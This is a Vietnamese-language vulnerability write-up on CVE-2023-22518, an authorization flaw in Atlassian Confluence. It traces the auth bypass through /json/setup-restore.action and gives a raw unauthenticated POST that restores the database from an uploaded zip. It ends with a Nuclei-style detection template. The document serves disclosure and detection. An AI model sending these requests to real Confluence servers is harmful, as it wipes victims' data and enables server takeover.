# CVE-2023-22518
CVE-2023-22518 là một lỗ hổng nghiêm trọng trong Máy chủ và Trung tâm dữ liệu hợp lưu Atlassian. Lỗ hổng này có khả năng cho phép những kẻ tấn công không được xác thực có quyền truy cập mạng vào Phiên bản Confluence khôi phục cơ sở dữ liệu của phiên bản Confluence và cuối cùng thực thi các lệnh hệ thống tùy ý.

## Chi tiết kỹ thuật
Sau khi thực hiện sự khác biệt về bản vá giữa các phiên bản đã vá và chưa được vá, tôi đã xác định việc bổ sung hai chú thích mới, cụ thể là @WebSudoRequired và @SystemAdminOnly, trong các lớp Hành động khác nhau.

Ban đầu, chúng tôi đã cố gắng áp đặt các lộ trình dẫn đến những hành động cụ thể này, nhưng cách tiếp cận này không mang lại thành công. Sau đó, chúng tôi chuyển sự chú ý sang tệp struts.xml, tệp này chứa thông tin về hành động và định tuyến dựa trên vùng tên cũng như các trình chặn, hy vọng khám phá được thông tin chi tiết. Tuy nhiên, không có gì nổi bật.


Ngoài ra, chúng tôi nhận thấy sự thay đổi về regex trong SafeParametersInterceptor, có liên quan đến CVE-2023-22515 quan trọng trước đó đã dẫn đến việc bỏ qua xác thực. Chúng tôi đã dành một lượng thời gian đáng kể để cố gắng khai thác sự thay đổi này nhưng không thể tạo ra bất kỳ bước đột phá nào. Cuộc điều tra của chúng tôi đã giúp chúng tôi hiểu rằng trong trường hợp ActionObject.getXYZ.getABC[N]=ANYTHING, trong đó N phải là một chữ số, SafeParametersInterceptor sẽ không coi khóa tham số là một tham số phức tạp và sẽ cho phép OgnlValueStack.setValue(. ..).

Kết quả phát hiện cho thấy một thách thức phức tạp: tìm cách vượt qua xác thực bằng cách thay đổi thuộc tính. Điều này đòi hỏi một getter trả về một tập hợp hoặc mảng và một chỉ số có setter có thể thao tác. Trọng tâm sau đó chuyển sang tập tin struts.xml để tìm manh mối. Quan sát kỹ lưỡng cho thấy namespace /json cải thiện chức năng của namespace /admin, cho phép truy cập các tuyến đường của /admin qua /json.

Trong /json, quá trình định tuyến yêu cầu qua nhiều bộ chặn, trong đó có WebSudoInterceptor, kiểm tra dựa trên URI yêu cầu. WebSudo, tính năng bảo mật của Atlassian Confluence, yêu cầu người dùng xác thực lại với quyền cao hơn, thường là mật khẩu, trước khi thực hiện thao tác quan trọng.

WebSudoInterceptor kiểm tra như sau:

Nếu đường dẫn là /authenticate.action, nó bỏ qua.
Nếu đường dẫn là /admin, nó kiểm tra thuộc tính WebSudoNotRequired không rỗng.
Đối với các đường dẫn khác như /json, nó đảm bảo thuộc tính WebSudoRequired rỗng. Điều này cho thấy không có annotation WebSudoRequired ở cấp độ lớp, gói, hoặc phương thức. Nếu điều kiện này được đáp ứng, kiểm tra WebSudo, chịu trách nhiệm bắt đầu phiên quản trị an toàn, sẽ bị bỏ qua.
Mục tiêu hiện tại là tìm ra một hành động (class) không có kiểm tra xác thực hoặc ủy quyền ở cấp độ phương thức xử lý HTTP.

Giai đoạn tiếp theo là thử nghiệm tất cả các endpoint/actions từ /admin/ sang /json/ để theo dõi phản hồi và tìm kiếm thông tin quan trọng. Quan sát thấy rằng khi thử nghiệm yêu cầu GET đến /json/setup-restore.action, phản hồi là 405 Method Not Allowed. Kiểm tra mã xác nhận nó không có annotation WebSudoRequired và không thực hiện kiểm tra xác thực phụ trong phương thức xử lý. Điều này có nghĩa là, bằng cách cung cấp các tham số chính xác, yêu cầu có thể thành công mà không cần xác thực.

HTTP:
```
POST /json/setup-restore.action?synchronous=true HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7
X-Atlassian-Token: no-check
Content-Length: 277538

------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="buildIndex"

false
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="file";filename="exploit-restore.zip"

ZIP_DATA
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="edit"

Upload and import
------WebKitFormBoundaryT3yekvo0rGaL9QR7--

```

Thật thú vị, việc chuyển synchronous=true những gì thực sự hiệu quả với chúng tôi. Đây là một thay đổi đơn giản từ sai thành đúng khi yêu cầu trước đó không dẫn đến khôi phục thành công, ngay cả khi tác vụ được tạo để khôi phục.

## Mẫu khai thác
Mẫu dựa trên phát hiện thay vì mẫu dựa trên khai thác đầy đủ cho CVE này.

YAML:
```
id: CVE-2023-22518

info:
  name: Atlassian Confluence Server - Improper Authorization
  author: ForceFledgling
  severity: critical
  description: |
    All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data.
    Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.
  reference:
    - https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907
    - https://jira.atlassian.com/browse/CONFSERVER-93142
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22518
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2023-22518
    epss-score: 0.00043
    epss-percentile: 0.0726
  metadata:
    verified: true
    max-request: 1
    vendor: atlassian
    product: confluence_data_center
    shodan-query: http.component:"Atlassian Confluence"
    note: this template attempts to validate the vulnerability by uploading an invalid (empty) zip file. This is a safe method for checking vulnerability and will not cause data loss or database reset. In real attack scenarios, a malicious file could potentially be used causing more severe impacts.
  tags: cve,cve2023,atlassian,confluence,rce,unauth

http:
  - raw:
      - |
        POST /json/setup-restore.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7
        X-Atlassian-Token: no-check

        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="buildIndex"

        true
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="file";filename="{{randstr}}.zip"

        {{randstr}}
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="edit"

        Upload and import
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7--

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body,'The zip file did not contain an entry', 'exportDescriptor.properties')"
        condition: and
```
